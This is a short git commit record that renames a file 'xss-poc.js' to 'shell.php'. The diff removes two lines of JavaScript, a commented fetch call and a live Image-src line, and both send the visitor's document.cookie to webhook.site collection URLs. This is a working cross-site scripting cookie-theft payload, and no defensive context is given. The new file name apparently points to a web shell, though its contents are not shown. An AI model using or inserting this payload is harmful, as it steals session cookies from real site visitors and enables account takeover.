a3058b04c95380ba6c1b0ba2ac17486b90ebe16f
The1976 <89992861+The1976@users.noreply.github.com>
2024-02-03 19:55:50 +0300

    Update and rename xss-poc.js to shell.php

--- xss-poc.js
+++
@@ -1,3 +0,0 @@
-// fetch("https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?cookie=" + document.cookie);
-
-var i=new Image;i.src="https://webhook.site/dadcf613-aeed-4648-8367-083c9f09af93/?cookie="+document.cookie;
